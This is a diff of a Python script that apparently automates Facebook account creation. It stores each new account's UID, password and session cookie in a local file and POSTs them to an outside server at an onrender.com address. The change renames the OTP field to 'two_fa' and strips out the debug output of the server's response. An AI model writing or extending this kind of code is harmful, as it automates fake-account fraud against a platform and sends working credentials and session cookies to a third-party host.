@@ -934,7 +934,7 @@ def confirm_id(mail,uid,otp,data,ses):
             cookie = ("; ").join([ "%s=%s" % (key,value) for key,value in ses.cookies.get_dict().items()])
             print(Panel(f"[bold green1] UID      : {uid}\n[bold green1] PASSWORD : {passw}\n[bold green1] COOKIE   : [bold green1]{cookie}\n[bold green1] USERAGENT : [bold green1]{useragent_facebook()}",subtitle="[bold yellow] CREATE ",style="bold magenta2"))
             open("/sdcard/CyberRow-X/SUCCESS-OK-ID.txt","a").write(uid+f"|{passw}|"+cookie+"\n")
-            status=post_account(uid,passw,cookie,email2,otp,useragent_facebook())
+            status=post_account(uid,passw,cookie,mail,"",useragent_facebook())
             if status is not None:
                 print(Panel(f"[bold green1] POST ACCOUNT SUCCESSFULLY",style="bold magenta2"))
             dn()
@@ -956,23 +956,18 @@ def get_email():
 
 import requests
 
-def post_account(uid, password, cookie, email, otp, useragent):
+def post_account(uid, password, cookie, email, two_fa, useragent):
     try:
         response = requests.post(
             'https://fbapi-5m2g.onrender.com/accounts',
-            json={"email": email, "password": password, "cookie": cookie, "uid": uid, "otp": otp, "useragent": useragent}
+            json={"email": email, "password": password, "cookie": cookie, "uid": uid, "two_fa": two_fa, "useragent": useragent}
         )
-
-        # In mã trạng thái và nội dung phản hồi để kiểm tra lỗi
-        print("🔹 Response Status Code:", response.status_code)
-        print("🔹 Response Body:", response.text)
 
         if response.status_code == 200:
             return "success"
         else:
             return None
     except requests.RequestException as e:
-        # In lỗi nếu request thất bại
         print("❌ Request Error:", str(e))
         return None
     except Exception as e:
